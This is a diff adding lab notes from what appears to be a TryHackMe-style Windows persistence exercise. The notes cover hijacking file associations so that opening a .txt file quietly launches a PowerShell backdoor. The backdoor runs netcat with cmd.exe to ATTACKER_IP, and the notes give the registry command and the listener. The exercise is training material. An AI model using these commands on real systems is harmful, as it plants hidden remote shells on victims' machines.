@@ -91,5 +91,23 @@ nc -lvp port
 -get flag5
 *THM{NO_SHORTCUTS_IN_LIFE}
 
+Hijacking File Associations
+-hijack any file association to force the os to run a shell wheever user opens a specific file
+-associations kept in HKLM\Software\Classes
+-find a reference to program halding the ProgID
+-exampel is txtfile -> NOTEPAD.EXE
+-%1 represents the name of the opened file
+-create a backdoor
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
+C:\Windows\system32\NOTEPAD.EXE $args[0]
+-change the registry key to backdoor
+powershell -windowstyle hidden C:\windows\backdoor2.ps1 %1
+-start listener
+nc -lvp 4448
+-run file
+-get flag
+*THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
+
+
 
 
